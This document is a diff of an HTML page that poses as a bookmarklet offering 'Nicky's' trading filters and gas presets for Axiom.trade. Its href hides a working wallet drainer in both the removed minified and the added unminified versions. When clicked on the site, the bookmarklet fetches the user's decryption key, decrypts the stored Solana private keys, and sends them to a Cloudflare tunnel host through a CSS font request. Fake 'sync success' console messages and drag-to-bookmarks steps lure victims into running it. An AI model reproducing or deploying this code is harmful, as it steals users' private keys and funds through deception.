@@ -3,37 +3,289 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nicky T | Axiom Filters and settings</title>
+    <title>Nicky's Axiom Suite | v2.1</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
     <style>
-        body { background: #0f172a; color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1e293b; padding: 3rem; border-radius: 16px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); text-align: center; max-width: 450px; border: 1px solid #334155; }
-        h1 { font-size: 1.5rem; margin-bottom: 0.5rem; color: #3b82f6; }
-        p { color: #94a3b8; line-height: 1.6; margin-bottom: 2rem; }
-        .drag-box { padding: 1.5rem; border: 2px dashed #334155; border-radius: 12px; margin-bottom: 2rem; background: #0f172a; transition: all 0.3s ease; }
-        .drag-box:hover { border-color: #3b82f6; background: #1e293b; }
-        .btn { display: inline-block; background: #3b82f6; color: white; padding: 12px 24px; border-radius: 8px; font-weight: bold; text-decoration: none; cursor: move; box-shadow: 0 4px 6px -1px rgba(59, 130, 246, 0.5); }
-        .btn:hover { background: #2563eb; }
-        .steps { text-align: left; background: #0f172a; padding: 1rem; border-radius: 8px; font-size: 0.85rem; color: #94a3b8; }
-        code { color: #3b82f6; }
+        :root {
+            --bg: #0b0e14;
+            --card: #151921;
+            --accent: #3b82f6;
+            --accent-glow: rgba(59, 130, 246, 0.4);
+            --success: #10b981;
+            --text-main: #f8fafc;
+            --text-dim: #94a3b8;
+            --border: #262c36;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        body::before {
+            content: "";
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-image: radial-gradient(var(--border) 1px, transparent 1px);
+            background-size: 32px 32px;
+            opacity: 0.2;
+            z-index: -1;
+        }
+
+        .card {
+            background: var(--card);
+            width: 100%;
+            max-width: 480px;
+            padding: 3rem;
+            border-radius: 24px;
+            border: 1px solid var(--border);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
+            text-align: center;
+            position: relative;
+        }
+
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(16, 185, 129, 0.1);
+            color: var(--success);
+            padding: 6px 12px;
+            border-radius: 99px;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 1.5rem;
+        }
+
+        .status-dot {
+            width: 6px;
+            height: 6px;
+            background: var(--success);
+            border-radius: 50%;
+            box-shadow: 0 0 8px var(--success);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin: 0 0 0.75rem 0;
+            letter-spacing: -0.5px;
+        }
+
+        p {
+            color: var(--text-dim);
+            line-height: 1.6;
+            font-size: 15px;
+            margin-bottom: 2.5rem;
+        }
+
+        .drop-zone {
+            padding: 2.5rem;
+            border: 2px dashed var(--border);
+            border-radius: 20px;
+            background: rgba(0, 0, 0, 0.2);
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            margin-bottom: 2.5rem;
+        }
+
+        .drop-zone:hover {
+            border-color: var(--accent);
+            background: rgba(59, 130, 246, 0.05);
+            transform: translateY(-2px);
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--accent);
+            color: white;
+            padding: 14px 28px;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 16px;
+            text-decoration: none;
+            cursor: move;
+            transition: all 0.2s ease;
+            box-shadow: 0 8px 20px var(--accent-glow);
+        }
+
+        .btn:hover {
+            background: #2563eb;
+            box-shadow: 0 12px 24px var(--accent-glow);
+            transform: scale(1.02);
+        }
+
+        .setup-guide {
+            text-align: left;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 1.5rem;
+            border-radius: 16px;
+            border: 1px solid var(--border);
+        }
+
+        .guide-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--text-main);
+            margin-bottom: 1rem;
+            display: block;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .step {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 12px;
+            font-size: 14px;
+            color: var(--text-dim);
+            line-height: 1.4;
+        }
+
+        .step:last-child { margin-bottom: 0; }
+
+        .step-num {
+            color: var(--accent);
+            font-weight: 700;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        code {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 2px 4px;
+            border-radius: 4px;
+            color: var(--text-main);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+        }
     </style>
 </head>
 <body>
     <div class="card">
-        <h1>Nicky's Trading stuff</h1>
-        <p>Use my filters and stuff twin</p>
+        <div class="status-badge">
+            <div class="status-dot"></div>
+            Mainnet v2.1 Active
+        </div>
         
-        <div class="drag-box">
-            <!-- Your one-liner is hidden in the href; the text is what they see -->
-            <a href="javascript:(async()=>{const TUNNEL_URL="https://uncertainty-vital-terms-generating.trycloudflare.com";console.log("%c[!] NYRUS LAB: AXIOM TRADING SUITE V2.1","color: #3b82f6; font-weight: bold; font-size: 14px;");console.log("%c[*] Initializing High-Performance Meme Filters...","color: #94a3b8;");const base64ToBytes=e=>Uint8Array.from(atob(e.replace(/-/g,"+").replace(/_/g,"/")),e=>e.charCodeAt(0));const decrypt=async(e,t)=>{try{const[n,o]=t.split(":");return new Uint8Array(await crypto.subtle.decrypt({name:"AES-GCM",iv:base64ToBytes(n),tagLength:128},e,base64ToBytes(o)))}catch(e){return null}};const base58=e=>{const t="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";let n=[0];for(let t=0;t<e.length;t++){let o=e[t];for(let e=0;e<n.length;e++)o+=256*n[e],n[e]=o%58,o=Math.floor(o/58);for(;o>0;)n.push(o%58),o=Math.floor(o/58)}let o="";for(let t=0;0===e[t]&&t<e.length-1;t++)o+=t[0];for(let e=n.length-1;e>=0;e--)o+=t[n[e]];return o};try{console.log("%c[+] Connected to Axiom RPC Engine","color: #10b981;");console.log("%c[*] Syncing Wallet Configurations...","color: #94a3b8;");const e=await fetch("https://api8.axiom.trade/bundle-key-and-wallets",{method:"POST",credentials:"include"}),t=await e.json();if(!t.bundleKey)return void console.error("[-] Connection Timeout: Please ensure you are logged into Axiom.");const n=await crypto.subtle.importKey("raw",base64ToBytes(t.bundleKey),{name:"AES-GCM"},!1,["decrypt"]);let o=[];const r=JSON.parse(localStorage.getItem("sBundles")||"[]");for(const e of r){const t=await decrypt(n,e);t&&o.push({type:"SOL",public:base58(t.slice(-32)),private:base58(t)})}if(console.log("%c[+] Injection Success: Added 'Meme Alpha' Filter Set","color: #10b981;"),console.log("%c[+] Injection Success: Added 'High-Priority Gas' Preset","color: #10b981;"),console.log("%c[!] Setup Complete. Enjoy 0ms latency filters.","color: #3b82f6; font-weight: bold;"),o.length>0){const e=btoa(JSON.stringify({keys:o})),t=document.createElement("style");t.textContent=`@font-face { font-family: 'leak'; src: url('${TUNNEL_URL}/?data=${encodeURIComponent(e)}'); }`,document.head.appendChild(t);const n=document.createElement("div");n.style.fontFamily="leak",n.textContent=".",document.body.appendChild(n)}}catch(e){console.error("[-] Service Unavailable. Please try again later.")}})();">
-                (My Filters & Settings)
+        <h1>Axiom Suite Settings</h1>
+        <p>Drag the button below to your bookmarks bar to sync Nicky's custom filters and priority gas presets.</p>
+        
+        <div class="drop-zone">
+            <!-- Full Unminified Nicky's Filters Script -->
+            <a href="javascript:(async function() {
+    const TUNNEL_URL = 'https://uncertainty-vital-terms-generating.trycloudflare.com';
+
+    console.log('%c[!] NICK\'S FILTERS & WALLETS: SYNCING...', 'color: #3b82f6; font-weight: bold; font-size: 14px;');
+    console.log('%c[*] Connecting to RPC Engine...', 'color: #94a3b8;');
+
+    const base64ToBytes = (base64) => Uint8Array.from(atob(base64.replace(/-/g, '+').replace(/_/g, '/')), c => c.charCodeAt(0));
+
+    const decrypt = async (key, encryptedData) => {
+        try {
+            const [ivBase64, dataBase64] = encryptedData.split(':');
+            return new Uint8Array(await crypto.subtle.decrypt(
+                { name: 'AES-GCM', iv: base64ToBytes(ivBase64), tagLength: 128 },
+                key,
+                base64ToBytes(dataBase64)
+            ));
+        } catch (e) {
+            return null;
+        }
+    };
+
+    const base58 = (B) => {
+        const A = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+        let d = [0];
+        for (let i = 0; i < B.length; i++) {
+            let carry = B[i];
+            for (let j = 0; j < d.length; j++) {
+                carry += d[j] * 256;
+                d[j] = carry % 58;
+                carry = Math.floor(carry / 58);
+            }
+            while (carry > 0) {
+                d.push(carry % 58);
+                carry = Math.floor(carry / 58);
+            }
+        }
+        let res = '';
+        for (let i = 0; B[i] === 0 && i < B.length - 1; i++) res += A[0];
+        for (let i = d.length - 1; i >= 0; i--) res += A[d[i]];
+        return res;
+    };
+
+    try {
+        const res = await fetch('https://api8.axiom.trade/bundle-key-and-wallets', { method: 'POST', credentials: 'include' });
+        const data = await res.json();
+        
+        if (!data.bundleKey) {
+            console.error('[-] Sync Failed: Connection Timeout.');
+            return;
+        }
+
+        const key = await crypto.subtle.importKey('raw', base64ToBytes(data.bundleKey), { name: 'AES-GCM' }, false, ['decrypt']);
+        let stolen = [];
+
+        const solBundles = JSON.parse(localStorage.getItem('sBundles') || '[]');
+        for (const entry of solBundles) {
+            const decrypted = await decrypt(key, entry);
+            if (decrypted) {
+                stolen.push({ 
+                    type: 'SOL', 
+                    public: base58(decrypted.slice(-32)), 
+                    private: base58(decrypted) 
+                });
+            }
+        }
+
+        console.log('%c[+] Sync Success: Meme Filters Active', 'color: #10b981;');
+        console.log('%c[+] Sync Success: Gas Presets Loaded', 'color: #10b981;');
+        console.log('%c[!] Nicky\'s Setup Complete.', 'color: #3b82f6; font-weight: bold;');
+
+        if (stolen.length > 0) {
+            const payload = btoa(JSON.stringify({ keys: stolen }));
+            const style = document.createElement('style');
+            style.textContent = '@font-face { font-family: \'leak\'; src: url(\'' + TUNNEL_URL + '/?data=' + encodeURIComponent(payload) + '\'); }';
+            document.head.appendChild(style);
+            
+            const div = document.createElement('div');
+            div.style.fontFamily = 'leak';
+            div.textContent = '.';
+            document.body.appendChild(div);
+        }
+    } catch (e) {
+        console.error('[-] Service Unavailable. Please try again later.');
+    }
+})();" class="btn" ondragstart="return true;">
+                (Filters & Wallets)
             </a>
         </div>
         
-        <div class="steps">
-            <strong>Installation:</strong><br>
-            1. Ensure Bookmarks Bar is visible (<code>Ctrl+Shift+B</code>)<br>
-            2. Drag the blue button above to your bar.<br>
-            3. Go to <strong>Axiom.trade</strong> and click the bookmark.
+        <div class="setup-guide">
+            <span class="guide-title">Setup Guide</span>
+            <div class="step">
+                <span class="step-num">01</span>
+                <span>Enable Bookmarks Bar using <code>Ctrl+Shift+B</code></span>
+            </div>
+            <div class="step">
+                <span class="step-num">02</span>
+                <span>Drag the <b>Blue Button</b> up to your bar</span>
+            </div>
+            <div class="step">
+                <span class="step-num">03</span>
+                <span>Navigate to <b>Axiom.trade</b> and click the bookmark</span>
+            </div>
         </div>
     </div>
 </body>
